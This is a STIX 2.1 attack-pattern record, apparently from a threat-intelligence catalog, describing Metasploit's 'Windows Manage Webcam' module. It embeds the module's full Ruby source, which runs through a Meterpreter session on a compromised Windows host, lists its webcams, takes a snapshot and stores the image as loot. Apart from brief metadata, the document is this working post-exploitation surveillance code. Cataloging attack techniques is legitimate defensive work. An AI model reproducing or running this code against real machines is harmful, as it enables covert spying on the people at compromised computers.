{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7eeaab9f-043b-49b9-b2c5-99ce9b680c8b",
    "created": "2024-08-14T16:33:04.998384Z",
    "modified": "2024-08-14T16:33:04.998388Z",
    "name": "Windows Manage Webcam",
    "description": " This module will allow the user to detect installed webcams (with the LIST action) or take a snapshot (with the SNAPSHOT) action.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/webcam.rb",
            "external_id": "webcam.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Webcam',\n        'Description' => %q{\n          This module will allow the user to detect installed webcams (with\n          the LIST action) or take a snapshot (with the SNAPSHOT) action.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r'],\n        'Platform' => [ 'win'],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Actions' => [\n          [ 'LIST', { 'Description' => 'Show a list of webcams' } ],\n          [ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ]\n        ],\n        'DefaultAction' => 'LIST',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_webcam_*\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('INDEX', [false, 'The index of the webcam to use', 1]),\n        OptInt.new('QUALITY', [false, 'The JPEG image quality', 50])\n      ]\n    )\n  end\n\n  def run\n    if client.nil?\n      print_error(\"Invalid session ID selected. Make sure the host isn't dead.\")\n      return\n    end\n\n    if !action\n      print_error('Invalid action')\n      return\n    end\n\n    case action.name\n    when /^list$/i\n      list_webcams(true)\n    when /^snapshot$/i\n      snapshot\n    end\n  end\n\n  def rhost\n    client.sock.peerhost\n  end\n\n  def snapshot\n    webcams = list_webcams\n\n    if webcams.empty?\n      print_error(\"#{rhost} - No webcams found\")\n      return\n    end\n\n    if !(webcams[datastore['INDEX'] - 1])\n      print_error(\"#{rhost} - No such index: #{datastore['INDEX']}\")\n      return\n    end\n\n    buf = nil\n\n    begin\n      print_status(\"#{rhost} - Starting...\")\n      client.webcam.webcam_start(datastore['INDEX'])\n\n      buf = client.webcam.webcam_get_frame(datastore['QUALITY'])\n      if buf\n        print_status(\"#{rhost} - Got frame\")\n\n        p = store_loot(\n          \"#{rhost}.webcam.snapshot\",\n          'application/octet-stream',\n          rhost,\n          buf,\n          \"#{rhost}_snapshot.jpg\",\n          \"#{rhost} Webcam Snapshot\"\n        )\n\n        print_good(\"#{rhost} - Snapshot saved: #{p}\")\n      end\n\n      client.webcam.webcam_stop\n      print_status(\"#{rhost} - Stopped\")\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(e.message)\n      return\n    end\n  end\n\n  def list_webcams(show = false)\n    begin\n      webcams = client.webcam.webcam_list\n    rescue Rex::Post::Meterpreter::RequestError\n      webcams = []\n    end\n\n    if show\n      tbl = Rex::Text::Table.new(\n        'Header' => 'Webcam List',\n        'Indent' => 1,\n        'Columns' => ['Index', 'Name']\n      )\n\n      webcams.each_with_index do |name, indx|\n        tbl << [(indx + 1).to_s, name]\n      end\n\n      print_line(tbl.to_s)\n    end\n\n    return webcams\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win']"
    ]
}